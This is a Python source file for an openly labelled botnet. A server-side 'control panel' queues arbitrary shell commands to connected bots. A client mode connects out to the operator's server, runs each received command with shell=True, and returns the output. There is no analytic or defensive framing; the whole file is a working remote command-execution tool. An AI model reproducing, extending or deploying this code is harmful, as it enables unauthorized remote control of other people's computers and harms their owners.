import socket
import threading
import os
import time
import platform
import subprocess
from queue import Queue
from colorama import init, Fore, Style

init()

class BotNetServer:
    def __init__(self, host, port, listen_port):
        self.host = host
        self.port = port
        self.listen_port = listen_port
        self.bots = []
        self.bot_count = 0
        self.queue = Queue()

    def print_menu(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(Fore.CYAN + """
        ╔════════════════════════════════════╗
        ║          b0tn3t c0ntr0l p4n3l      ║
        ╚════════════════════════════════════╝
        """ + Style.RESET_ALL)
        print(Fore.GREEN + f"[*] Server listening on {self.host}:{self.listen_port}")
        print(f"[*] Bots connected: {self.bot_count}")
        print("\n" + Fore.YELLOW + "Available Commands:")
        print("1. List Bots")
        print("2. Send Command to All Bots")
        print("3. Send Command to Specific Bot")
        print("4. Get Bot IP")
        print("5. Exit" + Style.RESET_ALL)
        print("\n" + Fore.MAGENTA + "Enter command number: " + Style.RESET_ALL, end="")

    def handle_client(self, client_socket, addr):
        self.bot_count += 1
        bot_id = self.bot_count
        
        # Receive OS info from bot
        os_info = client_socket.recv(1024).decode()
        self.bots.append((client_socket, addr, bot_id, os_info))
        
        print(Fore.GREEN + f"[*] Bots online {self.bot_count}" + Style.RESET_ALL)
        client_socket.send(f"Connected as Bot {bot_id}".encode())
        
        while True:
            try:
                command_data = self.queue.get_nowait() if not self.queue.empty() else None
                if command_data:
                    target_bot_id, command = command_data
                    if target_bot_id == 'all' or target_bot_id == str(bot_id):
                        if command == "get_ip":
                            client_socket.send("get_ip".encode())
                            response = client_socket.recv(1024).decode()
                            print(Fore.BLUE + f"[Bot {bot_id} ({os_info})] IP Address: {response}" + Style.RESET_ALL)
                        else:
                            client_socket.send(command.encode())
                            response = client_socket.recv(4096).decode()
                            print(Fore.BLUE + f"[Bot {bot_id} ({os_info})] Response: {response}" + Style.RESET_ALL)
                    else:
                        self.queue.put(command_data) # Put back if not for this bot
            except:
                break
        
        # Remove bot from list
        for i, bot in enumerate(self.bots):
            if bot[2] == bot_id:
                self.bots.pop(i)
                break
        self.bot_count -= 1
        print(Fore.RED + f"[*] Bot {bot_id} disconnected. Bots online {self.bot_count}" + Style.RESET_ALL)
        client_socket.close()

    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.listen_port))
        server.listen(5)
        print(Fore.GREEN + f"[*] Server started on {self.host}:{self.listen_port}" + Style.RESET_ALL)

        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr))
            client_thread.start()

    def send_command(self, target_bot_id, command):
        self.queue.put((target_bot_id, command))

def client_connect(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))
    
    # Send OS info to server
    os_info = f"{platform.system()} {platform.release()}"
    client.send(os_info.encode())
    
    while True:
        try:
            data = client.recv(1024).decode()
            if data == "get_ip":
                client.send(client.getsockname()[0].encode())
            elif data:
                try:
                    result = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, text=True)
                    client.send(f"Executed: {result}".encode())
                except Exception as e:
                    client.send(f"Error executing command: {e}".encode())
        except:
            break
    client.close()

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + """
    ╔════════════════════════════════════╗
    ║       b0tn3t s3tup 1nt3rf31s       ║
    ╚════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    mode = input(Fore.YELLOW + "[*] Run as (1) Server or (2) Client? [1/2]: " + Style.RESET_ALL)
    
    if mode == '1':
        host = input(Fore.YELLOW + "[*] Enter server IP (e.g., 0.0.0.0): " + Style.RESET_ALL)
        listen_port = int(input(Fore.YELLOW + "[*] Enter listening port: " + Style.RESET_ALL))
        botnet = BotNetServer(host, 0, listen_port)
        
        server_thread = threading.Thread(target=botnet.start_server)
        server_thread.daemon = True
        server_thread.start()
        
        while True:
            botnet.print_menu()
            choice = input()
            
            if choice == '1':
                print(Fore.GREEN + "[*] Connected Bots:" + Style.RESET_ALL)
                for _, addr, bot_id, os_info in botnet.bots:
                    print(Fore.BLUE + f"Bot {bot_id}: {addr[0]}:{addr[1]} (OS: {os_info})" + Style.RESET_ALL)
                input(Fore.YELLOW + "\nPress Enter to continue..." + Style.RESET_ALL)
            
            elif choice == '2':
                command = input(Fore.YELLOW + "[*] Enter command to send to all bots: " + Style.RESET_ALL)
                botnet.send_command("all", command)
            
            elif choice == '3':
                bot_id = input(Fore.YELLOW + "[*] Enter Bot ID to send command to: " + Style.RESET_ALL)
                command = input(Fore.YELLOW + f"[*] Enter command to send to Bot {bot_id}: " + Style.RESET_ALL)
                botnet.send_command(bot_id, command)
            
            elif choice == '4':
                bot_id = input(Fore.YELLOW + "[*] Enter Bot ID to get IP from: " + Style.RESET_ALL)
                botnet.send_command(bot_id, "get_ip")
            
            elif choice == '5':
                print(Fore.RED + "[*] Shutting down server..." + Style.RESET_ALL)
                break
            
            time.sleep(1)
    
    elif mode == '2':
        target_ip = input(Fore.YELLOW + "[*] Enter target IP: " + Style.RESET_ALL)
        target_port = int(input(Fore.YELLOW + "[*] Enter target port: " + Style.RESET_ALL))
        client_connect(target_ip, target_port)
    
    else:
        print(Fore.RED + "[!] Invalid choice. Exiting..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()

